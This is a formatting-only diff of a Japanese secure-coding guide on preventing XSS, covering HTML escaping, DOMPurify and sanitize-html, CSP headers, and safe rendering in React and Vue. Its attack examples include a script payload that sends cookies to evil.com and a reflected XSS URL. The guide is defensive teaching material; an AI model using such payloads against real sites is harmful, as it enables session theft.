@@ -13,7 +13,8 @@ HTMLエスケープ、CSP、サニタイザーライブラリの活用方法を�
 
 ```typescript
 // 攻撃例: コメント投稿
-const maliciousComment = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';
+const maliciousComment =
+  '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';
 
 // ❌ 危険: そのまま表示
 element.innerHTML = comment;
@@ -30,11 +31,11 @@ URLパラメータなどの入力が即座にレスポンスに反映される�
 // 攻撃URL: example.com/search?q=<script>alert('XSS')</script>
 
 // ❌ 危険
-const query = new URLSearchParams(window.location.search).get('q');
-document.getElementById('result').innerHTML = `検索結果: ${query}`;
+const query = new URLSearchParams(window.location.search).get("q");
+document.getElementById("result").innerHTML = `検索結果: ${query}`;
 
 // ✅ 安全
-document.getElementById('result').textContent = `検索結果: ${query}`;
+document.getElementById("result").textContent = `検索結果: ${query}`;
 ```
 
 ### 3. DOM-based XSS
@@ -50,7 +51,7 @@ eval(userInput);
 
 // ✅ 安全なシンク
 element.textContent = userInput;
-element.setAttribute('data-value', userInput);
+element.setAttribute("data-value", userInput);
 ```
 
 ## HTMLエスケープ
@@ -60,11 +61,11 @@ element.setAttribute('data-value', userInput);
 ```typescript
 function escapeHtml(unsafe: string): string {
   return unsafe
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#039;');
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
 }
 
 // 使用例
@@ -78,26 +79,34 @@ const safe = escapeHtml(userInput);
 ```typescript
 // HTMLコンテキスト
 function escapeHtmlContent(input: string): string {
-  return input.replace(/[&<>"']/g, (char) => ({
-    '&': '&amp;',
-    '<': '&lt;',
-    '>': '&gt;',
-    '"': '&quot;',
-    "'": '&#x27;',
-  }[char] || char));
+  return input.replace(
+    /[&<>"']/g,
+    (char) =>
+      ({
+        "&": "&amp;",
+        "<": "&lt;",
+        ">": "&gt;",
+        '"': "&quot;",
+        "'": "&#x27;",
+      })[char] || char,
+  );
 }
 
 // 属性コンテキスト
 function escapeHtmlAttribute(input: string): string {
-  return input.replace(/[&<>"'\n\r]/g, (char) => ({
-    '&': '&amp;',
-    '<': '&lt;',
-    '>': '&gt;',
-    '"': '&quot;',
-    "'": '&#x27;',
-    '\n': '&#x0a;',
-    '\r': '&#x0d;',
-  }[char] || char));
+  return input.replace(
+    /[&<>"'\n\r]/g,
+    (char) =>
+      ({
+        "&": "&amp;",
+        "<": "&lt;",
+        ">": "&gt;",
+        '"': "&quot;",
+        "'": "&#x27;",
+        "\n": "&#x0a;",
+        "\r": "&#x0d;",
+      })[char] || char,
+  );
 }
 
 // URLコンテキスト
@@ -116,31 +125,49 @@ function escapeJavaScript(input: string): string {
 ### DOMPurify
 
 ```typescript
-import DOMPurify from 'dompurify';
+import DOMPurify from "dompurify";
 
 // 基本的な使用
 const clean = DOMPurify.sanitize(dirty);
 
 // HTMLのみ許可（スクリプト除去）
 const cleanHtml = DOMPurify.sanitize(dirty, {
-  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
-  ALLOWED_ATTR: ['href', 'title'],
+  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
+  ALLOWED_ATTR: ["href", "title"],
 });
 
 // 設定例：リッチテキストエディタ用
 const richTextConfig = {
   ALLOWED_TAGS: [
-    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
-    'p', 'br', 'hr',
-    'ul', 'ol', 'li',
-    'blockquote', 'pre', 'code',
-    'a', 'img',
-    'strong', 'em', 'u', 's',
-    'table', 'thead', 'tbody', 'tr', 'th', 'td',
+    "h1",
+    "h2",
+    "h3",
+    "h4",
+    "h5",
+    "h6",
+    "p",
+    "br",
+    "hr",
+    "ul",
+    "ol",
+    "li",
+    "blockquote",
+    "pre",
+    "code",
+    "a",
+    "img",
+    "strong",
+    "em",
+    "u",
+    "s",
+    "table",
+    "thead",
+    "tbody",
+    "tr",
+    "th",
+    "td",
   ],
-  ALLOWED_ATTR: [
-    'href', 'src', 'alt', 'title', 'class',
-  ],
+  ALLOWED_ATTR: ["href", "src", "alt", "title", "class"],
   ALLOW_DATA_ATTR: false,
 };
 
@@ -150,14 +177,14 @@ const cleanRichText = DOMPurify.sanitize(dirty, richTextConfig);
 ### sanitize-html（Node.js）
 
 ```typescript
-import sanitizeHtml from 'sanitize-html';
+import sanitizeHtml from "sanitize-html";
 
 const clean = sanitizeHtml(dirty, {
-  allowedTags: ['b', 'i', 'em', 'strong', 'a'],
+  allowedTags: ["b", "i", "em", "strong", "a"],
   allowedAttributes: {
-    'a': ['href'],
+    a: ["href"],
   },
-  allowedSchemes: ['http', 'https', 'mailto'],
+  allowedSchemes: ["http", "https", "mailto"],
 });
 ```
 
@@ -167,7 +194,7 @@ const clean = sanitizeHtml(dirty, {
 
 ```typescript
 // Express.js
-import helmet from 'helmet';
+import helmet from "helmet";
 
 app.use(
   helmet.contentSecurityPolicy({
@@ -175,7 +202,7 @@ app.use(
       defaultSrc: ["'self'"],
       scriptSrc: ["'self'"],
       styleSrc: ["'self'", "'unsafe-inline'"],
-      imgSrc: ["'self'", 'data:', 'https:'],
+      imgSrc: ["'self'", "data:", "https:"],
       connectSrc: ["'self'"],
       fontSrc: ["'self'"],
       objectSrc: ["'none'"],
@@ -183,7 +210,7 @@ app.use(
       formAction: ["'self'"],
       upgradeInsecureRequests: [],
     },
-  })
+  }),
 );
 ```
 
@@ -206,19 +233,19 @@ Content-Security-Policy:
 ### Nonceベースのスクリプト許可
 
 ```typescript
-import crypto from 'crypto';
+import crypto from "crypto";
 
 // ノンス生成
 function generateNonce(): string {
-  return crypto.randomBytes(16).toString('base64');
+  return crypto.randomBytes(16).toString("base64");
 }
 
 // Express middleware
 app.use((req, res, next) => {
   res.locals.nonce = generateNonce();
   res.setHeader(
-    'Content-Security-Policy',
-    `script-src 'self' 'nonce-${res.locals.nonce}'`
+    "Content-Security-Policy",
+    `script-src 'self' 'nonce-${res.locals.nonce}'`,
   );
   next();
 });
@@ -238,7 +265,7 @@ function SafeComponent({ userInput }: { userInput: string }) {
 }
 
 // ⚠️ 危険：dangerouslySetInnerHTMLを使う場合は必ずサニタイズ
-import DOMPurify from 'dompurify';
+import DOMPurify from "dompurify";
 
 function RichTextComponent({ html }: { html: string }) {
   return (
@@ -251,8 +278,14 @@ function RichTextComponent({ html }: { html: string }) {
 }
 
 // ✅ href属性の検証
-function SafeLink({ url, children }: { url: string; children: React.ReactNode }) {
-  const safeUrl = url.startsWith('javascript:') ? '#' : url;
+function SafeLink({
+  url,
+  children,
+}: {
+  url: string;
+  children: React.ReactNode;
+}) {
+  const safeUrl = url.startsWith("javascript:") ? "#" : url;
   return <a href={safeUrl}>{children}</a>;
 }
 ```
@@ -269,17 +302,15 @@ function SafeLink({ url, children }: { url: string; children: React.ReactNode })
 </template>
 
 <script setup lang="ts">
-import DOMPurify from 'dompurify';
-import { computed } from 'vue';
+import DOMPurify from "dompurify";
+import { computed } from "vue";
 
 const props = defineProps<{
   userInput: string;
   rawHtml: string;
 }>();
 
-const sanitizedHtml = computed(() =>
-  DOMPurify.sanitize(props.rawHtml)
-);
+const sanitizedHtml = computed(() => DOMPurify.sanitize(props.rawHtml));
 </script>
 ```
 
@@ -290,7 +321,7 @@ const sanitizedHtml = computed(() =>
 function isValidUrl(url: string): boolean {
   try {
     const parsed = new URL(url);
-    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
+    return ["http:", "https:", "mailto:"].includes(parsed.protocol);
   } catch {
     return false;
   }
@@ -299,18 +330,18 @@ function isValidUrl(url: string): boolean {
 // JavaScript URLの検出
 function isSafeUrl(url: string): boolean {
   const lowerUrl = url.toLowerCase().trim();
-  if (lowerUrl.startsWith('javascript:')) return false;
-  if (lowerUrl.startsWith('data:')) return false;
-  if (lowerUrl.startsWith('vbscript:')) return false;
+  if (lowerUrl.startsWith("javascript:")) return false;
+  if (lowerUrl.startsWith("data:")) return false;
+  if (lowerUrl.startsWith("vbscript:")) return false;
   return true;
 }
 
 // 安全なリンク生成
 function createSafeLink(url: string): string {
   if (!isSafeUrl(url)) {
-    return '#';
+    return "#";
   }
-  if (!url.startsWith('http://') && !url.startsWith('https://')) {
+  if (!url.startsWith("http://") && !url.startsWith("https://")) {
     return `https://${url}`;
   }
   return url;
@@ -337,10 +368,10 @@ const contexts = {
 ```typescript
 // セキュリティヘッダー
 app.use((req, res, next) => {
-  res.setHeader('X-Content-Type-Options', 'nosniff');
-  res.setHeader('X-Frame-Options', 'DENY');
-  res.setHeader('X-XSS-Protection', '1; mode=block');
-  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  res.setHeader("X-Content-Type-Options", "nosniff");
+  res.setHeader("X-Frame-Options", "DENY");
+  res.setHeader("X-XSS-Protection", "1; mode=block");
+  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
   next();
 });
 ```
@@ -349,16 +380,16 @@ app.use((req, res, next) => {
 
 ```typescript
 // セキュアなCookie設定
-res.cookie('session', sessionId, {
-  httpOnly: true,    // JavaScript からアクセス不可
-  secure: true,      // HTTPS のみ
-  sameSite: 'strict', // CSRF 対策
-  maxAge: 3600000,   // 1時間
+res.cookie("session", sessionId, {
+  httpOnly: true, // JavaScript からアクセス不可
+  secure: true, // HTTPS のみ
+  sameSite: "strict", // CSRF 対策
+  maxAge: 3600000, // 1時間
 });
 ```
 
 ## 変更履歴
 
-| バージョン | 日付 | 変更内容 |
-|-----------|------|---------|
-| 1.0.0 | 2025-11-25 | 初版リリース |
+| バージョン | 日付       | 変更内容     |
+| ---------- | ---------- | ------------ |
+| 1.0.0      | 2025-11-25 | 初版リリース |
